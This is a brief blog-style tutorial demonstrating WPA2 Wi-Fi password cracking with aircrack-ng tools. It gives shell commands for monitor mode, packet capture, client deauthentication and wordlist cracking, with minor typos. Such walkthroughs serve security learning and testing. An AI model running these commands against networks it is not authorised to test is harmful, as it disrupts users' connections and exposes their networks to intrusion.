---
title: Demo Crack WPA2 
date: 2023-06-25 22:50:30 +/-TTTT
categories: [Wifi, Crack WPA2]
tags: [Crack WPA2] 

image:
  path: /assets/img/wifi/demo/logo.jpg
#   alt: image alternative text
---
In this post , I will simulate the process of cracking WPA2.

- Start monitor mode
```shell
sudo airmon-ng start wlan0
```
![](/assets/img/wifi/demo/start.png)

- View bssid (BSSID) and channel (CH) the device we need crack
![](/assets/img/wifi/demo/view.png)

- Capture packet of the device
```shell
sudo airodump-ng -w <capture_name> -c <channel> --bssid <bssid_device> <interface>
```
![](/assets/img/wifi/demo/capture.png)

- Deauthen client
```shell
sudo aireplay-ng -0 <number_frame> -a <ssid_device> -c <MAC_Client> <interface>
```
![](/assets/img/wifi/demo/deauthen.png)

- Crack passwd
```shel
sudo aircrack-ng <capture_name> -w <wordlist
```
![](/assets/img/wifi/demo/crack.png)